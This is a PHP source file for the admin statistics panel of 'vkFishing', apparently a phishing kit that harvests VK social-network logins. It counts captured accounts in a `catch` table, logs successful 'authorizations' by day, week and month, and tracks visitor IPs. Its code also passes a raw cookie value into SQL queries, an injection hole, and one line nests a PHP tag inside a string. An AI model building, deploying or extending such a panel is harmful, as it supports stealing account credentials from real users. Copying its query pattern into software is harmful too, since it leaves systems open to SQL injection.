<?php

	session_start();

	if(isset($_COOKIE['uid']) AND isset($_COOKIE['code']) AND isset($_COOKIE['hash'])) {
		$user = mysql_fetch_assoc(mysql_query("SELECT `id`, `code` FROM `users` WHERE `id` = '".$_COOKIE['uid']."'"));
		$code = md5($user['code']);
		$hash = md5($_SERVER['REMOTE_ADDR'].':'.$user['id']);
		
		if($_COOKIE['uid'] != $user['id'] OR $_COOKIE['code'] != $code OR $_COOKIE['hash'] != $hash) {
			setcookie('uid', NULL, time()-3600*7);
			setcookie('code', NULL, time()-3600*7);
			setcookie('hash', NULL, time()-3600*7);
			header('Location: '.siteURL().'/apanel?act=auth');
		} else {
			$admin = mysql_fetch_assoc(mysql_query("SELECT `login`,`dark_theme`,`preloader` FROM `users` WHERE `id` = '".$_COOKIE['uid']."'"));
		}
	} else {
		setcookie('uid', NULL, time()-3600*7);
		setcookie('code', NULL, time()-3600*7);
		setcookie('hash', NULL, time()-3600*7);
		header('Location: '.siteURL().'/apanel?act=auth');
	}
		
?>

<!DOCTYPE html>
<html lang="en">
<head>
	<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
	<title><?php echo $page['title']; ?></title>
	<link href="<?php echo siteURL(); ?>/core/themes/dashboard/css/font-awesome.css" rel="stylesheet">
	<link href="<?php echo siteURL(); ?>/core/themes/dashboard/css/ionicons.css" rel="stylesheet">
	<link href="<?php echo siteURL(); ?>/core/themes/dashboard/css/chartist.css" rel="stylesheet">
	<link href="<?php echo siteURL(); ?>/core/themes/dashboard/css/rickshaw.min.css" rel="stylesheet">
	<link rel="stylesheet" href="<?php echo siteURL(); ?>/core/themes/dashboard/css/dashboard.css">
	<?php if($config['dark_theme'] == True AND $admin['dark_theme'] == True) { echo '<link rel="stylesheet" href="<?php echo siteURL(); ?>/core/themes/dashboard/css/dashboard.css">'; } ?>
</head>
<body>
	<?php if($config['preloader'] == True AND $admin['preloader'] == True) { ?>
	<div id="loading">
		<div id="loading-center">
			<div id="loading-center-absolute">
				<div class="object" id="object_four"></div>
				<div class="object" id="object_three"></div>
				<div class="object" id="object_two"></div>
				<div class="object" id="object_one"></div>
			</div>
		</div>
	</div>
	<?php } ?>
	<div class="slim-header">
		<div class="container">
			<div class="slim-header-left">
				<h2 class="slim-logo"><a href="<?php echo siteURL().'/apanel'; ?>">vkFishing</a></h2>
			</div>
			<div class="slim-header-right">
				<a href="<?php echo siteURL(); ?>/apanel?act=settings" class="header-notification">
					<i class="icon ion-gear-a"></i>
				</a>
				<a href="<?php echo siteURL(); ?>/apanel?act=stats" class="header-notification">
					<i class="icon ion-stats-bars"></i>
				</a>
				<div class="dropdown dropdown-c">
					<a href="#" class="logged-user" data-toggle="dropdown"> <img src="https://vk.com/images/gift/952/512.png" alt=""> <span><?php echo $admin['login']; ?></span> <i class="fa fa-angle-down"></i> </a>
					<div class="dropdown-menu dropdown-menu-right">
						<nav class="nav"><a href="<?php echo siteURL(); ?>/apanel?act=edit" class="nav-link"><i class="icon ion-ios-gear"></i> Настройки</a> <a href="<?php echo siteURL().'/apanel?act=logout&hash='.$_COOKIE['hash']; ?>" class="nav-link"><i class="icon ion-forward"></i> Выход</a> </nav>
					</div>
				</div>
			</div>
		</div>
	</div>
	<div class="slim-mainpanel" style="position: relative;">
		<div class="container">
			<div class="slim-pageheader">
				<ol class="breadcrumb slim-breadcrumb"></ol>
				<h6 class="slim-pagetitle">Статистика</h6>
			</div>
			<div class="card card-dash-one">
				<div class="row no-gutters">
					<div class="col-lg-4"> <i class="icon ion-ios-pie-outline"></i>
						<div class="dash-content">
							<label class="tx-success">Авторизаций сегодня</label>
							<h2><?php $aTotal = mysql_fetch_row(mysql_query("SELECT COUNT(*) FROM `catch` WHERE `date` >= CURDATE()")); echo number_format($aTotal['0'], 0, '', ' '); ?></h2> </div>
					</div>
					<div class="col-lg-4"> <i class="icon ion-person-stalker"></i>
						<div class="dash-content">
							<label class="tx-primary">Посещений сегодня</label>
							<h2><?php $vTotal = mysql_fetch_row(mysql_query("SELECT COUNT(*) FROM `visitors` WHERE `date` >= CURDATE()")); echo number_format($vTotal['0'], 0, '', ' '); ?></h2> </div>
					</div>
					<div class="col-lg-4"> <i class="icon ion-person-stalker"></i>
						<div class="dash-content">
							<label class="tx-purple">Посетителей сегодня</label>
							<h2><?php $uTotal = mysql_fetch_row(mysql_query("SELECT COUNT(distinct `ip`) FROM `visitors` WHERE `date` >= CURDATE()")); echo number_format($uTotal['0'], 0, '', ' '); ?></h2> </div>
					</div>
				</div>
			</div>
			<div class="card card-dash-one mg-t-20">
				<div class="row no-gutters">
					<div class="col-lg-4"> <i class="icon ion-person-stalker"></i>
						<div class="dash-content">
							<label class="tx-success">Всего аккаунтов</label>
							<h2><?php $cTotal = mysql_fetch_row(mysql_query("SELECT COUNT(*) FROM `catch` WHERE `hide` = '0'")); echo number_format($cTotal['0'], 0, '', ' '); ?></h2> </div>
					</div>
					<div class="col-lg-4"> <i class="icon ion-ios-pie-outline"></i>
						<div class="dash-content">
							<label class="tx-purple">Всего посещений</label>
							<h2><?php $vTotal = mysql_fetch_row(mysql_query("SELECT COUNT(*) FROM `visitors`")); echo number_format($vTotal['0'], 0, '', ' '); ?></h2> </div>
					</div>
					<div class="col-lg-4"> <i class="icon ion-ios-pie-outline"></i>
						<div class="dash-content">
							<label class="tx-primary">Уникальных посетителей</label>
							<h2><?php $uTotal = mysql_fetch_row(mysql_query("SELECT COUNT(distinct `ip`) FROM `visitors`")); echo number_format($uTotal['0'], 0, '', ' '); ?></h2> </div>
					</div>
				</div>
			</div>
			<div class="row row-sm mg-t-20">
				<div class="col-lg-4">
					<div class="card card-sales">
						<h6 class="slim-card-title tx-success">Успешные авторизации</h6>
						<div class="row">
							<div class="col">
								<label class="tx-12">Вчера</label>
								<p><?php $tTotal = mysql_fetch_row(mysql_query("SELECT COUNT(*) FROM `catch` WHERE `date` >= (CURDATE()-1) AND `date` < CURDATE()")); echo number_format($tTotal['0'], 0, '', ' '); ?></p>
							</div>
							<div class="col">
								<label class="tx-12">За неделю</label>
								<p><?php $wTotal = mysql_fetch_row(mysql_query("SELECT COUNT(*) FROM `catch` WHERE `date` >= DATE_SUB(CURRENT_DATE, INTERVAL 7 DAY)")); echo number_format($wTotal['0'], 0, '', ' '); ?></p>
							</div>
							<div class="col">
								<label class="tx-12">За месяц</label>
								<p><?php $mTotal = mysql_fetch_row(mysql_query("SELECT COUNT(*) FROM `catch` WHERE `date` >= DATE_SUB(CURRENT_DATE, INTERVAL 30 DAY)")); echo number_format($mTotal['0'], 0, '', ' '); ?></p>
							</div>
							
						</div>
						<p class="tx-12 mg-b-0">Последнее обновление: только что</p>
					</div>
				</div>
				<div class="col-lg-4 mg-t-20 mg-lg-t-0">
					<div class="card card-sales">
						<h6 class="slim-card-title tx-primary">Посещений сайта</h6>
						<div class="row">
							<div class="col">
								<label class="tx-12">Вчера</label>
								<p><?php $tTotal = mysql_fetch_row(mysql_query("SELECT COUNT(*) FROM `visitors` WHERE `date` >= (CURDATE()-1) AND `date` < CURDATE()")); echo number_format($tTotal['0'], 0, '', ' '); ?></p>
							</div>
							<div class="col">
								<label class="tx-12">За неделю</label>
								<p><?php $wTotal = mysql_fetch_row(mysql_query("SELECT COUNT(*) FROM `visitors` WHERE `date` >= DATE_SUB(CURRENT_DATE, INTERVAL 7 DAY)")); echo number_format($wTotal['0'], 0, '', ' '); ?></p>
							</div>
							<div class="col">
								<label class="tx-12">За месяц</label>
								<p><?php $mTotal = mysql_fetch_row(mysql_query("SELECT COUNT(*) FROM `visitors` WHERE `date` >= DATE_SUB(CURRENT_DATE, INTERVAL 30 DAY)")); echo number_format($mTotal['0'], 0, '', ' '); ?></p>
							</div>
							
						</div>
						<p class="tx-12 mg-b-0">Последнее обновление: только что</p>
					</div>
				</div>
				<div class="col-lg-4 mg-t-20 mg-lg-t-0">
					<div class="card card-sales">
						<h6 class="slim-card-title tx-purple">Уникальные посетители</h6>
						<div class="row">
							<div class="col">
								<label class="tx-12">Вчера</label>
								<p><?php $tTotal = mysql_fetch_row(mysql_query("SELECT COUNT(distinct `ip`) FROM `visitors` WHERE `date` >= (CURDATE()-1) AND `date` < CURDATE()")); echo number_format($tTotal['0'], 0, '', ' '); ?></p>
							</div>
							<div class="col">
								<label class="tx-12">За неделю</label>
								<p><?php $wTotal = mysql_fetch_row(mysql_query("SELECT COUNT(distinct `ip`) FROM `visitors` WHERE `date` >= DATE_SUB(CURRENT_DATE, INTERVAL 7 DAY)")); echo number_format($wTotal['0'], 0, '', ' '); ?></p>
							</div>
							<div class="col">
								<label class="tx-12">За месяц</label>
								<p><?php $mTotal = mysql_fetch_row(mysql_query("SELECT COUNT(distinct `ip`) FROM `visitors` WHERE `date` >= DATE_SUB(CURRENT_DATE, INTERVAL 30 DAY)")); echo number_format($mTotal['0'], 0, '', ' '); ?></p>
							</div>
							
						</div>
						<p class="tx-12 mg-b-0">Последнее обновление: только что</p>
					</div>
				</div>
			</div>
		</div>
	</div>
	<div class="slim-footer">
		<div class="container">
			<p>Copyright 2019 © All Rights Reserved.</p>
			<p>Created with <font color="red">❤</font> by <a href="https://lolzteam.net/aptyp4uk1337" target="_blank">ApTyp4uK1337</a></p>
		</div>
	</div>
	<script src="<?php echo siteURL(); ?>/core/themes/dashboard/js/jquery.js"></script>
	<script src="<?php echo siteURL(); ?>/core/themes/dashboard/js/popper.js"></script>
	<script src="<?php echo siteURL(); ?>/core/themes/dashboard/js/bootstrap.js"></script>
	<script src="<?php echo siteURL(); ?>/core/themes/dashboard/js/jquery.cookie.js"></script>
	<script src="<?php echo siteURL(); ?>/core/themes/dashboard/js/chartist.js"></script>
	<script src="<?php echo siteURL(); ?>/core/themes/dashboard/js/d3.js"></script>
	<script src="<?php echo siteURL(); ?>/core/themes/dashboard/js/rickshaw.min.js"></script>
	<script src="<?php echo siteURL(); ?>/core/themes/dashboard/js/jquery.sparkline.min.js"></script>
	<script src="<?php echo siteURL(); ?>/core/themes/dashboard/js/ResizeSensor.js"></script>
	<script src="<?php echo siteURL(); ?>/core/themes/dashboard/js/dashboard.js"></script>
	<script src="<?php echo siteURL(); ?>/core/themes/dashboard/js/slim.js"></script>
	<?php if($config['preloader'] == True AND $admin['preloader'] == True) { ?>
	<script type="text/javascript">
		$(window).load(function() {
			$("#loading").fadeOut(500);
			$("#loading-center").click(function() {
				$("#loading").fadeOut(500);
			})
		})
	</script>
	<?php } ?>
</body>
</html>